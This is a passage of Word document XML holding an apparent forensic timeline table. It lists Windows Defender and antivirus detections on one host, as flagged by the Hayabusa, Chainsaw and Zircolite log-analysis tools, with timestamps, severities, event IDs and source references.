          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708000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16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5898</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708098</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16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#51</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708098</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16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#52</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:44.708098</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16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#193</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:52.220594</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17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#53</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:52.220594</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17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#54</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:52.220594</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17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#194</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:53.989000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22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5893</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:53.989000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22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5899</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:53.989027</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22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#56</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:53.989027</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22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#195</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:53.989027</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22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#55</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:54.028000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23</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5894</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:54.028000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23</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5900</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:54.028923</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23</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#57</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:54.028923</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23</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#58</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:54.028923</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23</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#196</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:59.060735</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24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#59</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:59.060735</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24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#60</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:59.060735</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24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#197</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.396000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26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5895</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.396000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26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5901</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.396421</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26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#61</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.396421</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26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#62</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.396421</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26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#199</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.431000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Defender Alert (Severe)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27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5896</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.431000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Antivirus - Exploitation Framework Signature</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Defender</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>1116</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#5902</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.431470</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27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#63</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.431470</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27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.431470</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1116</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#200</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:41.471520</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Windows Defender</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28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#65</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:41.471520</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</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28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#66</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:41.471520</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Windows Defender Threat Detected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1117</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#201</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:46.897000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Windows Defender Threat Detection Disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Defender</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>5001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
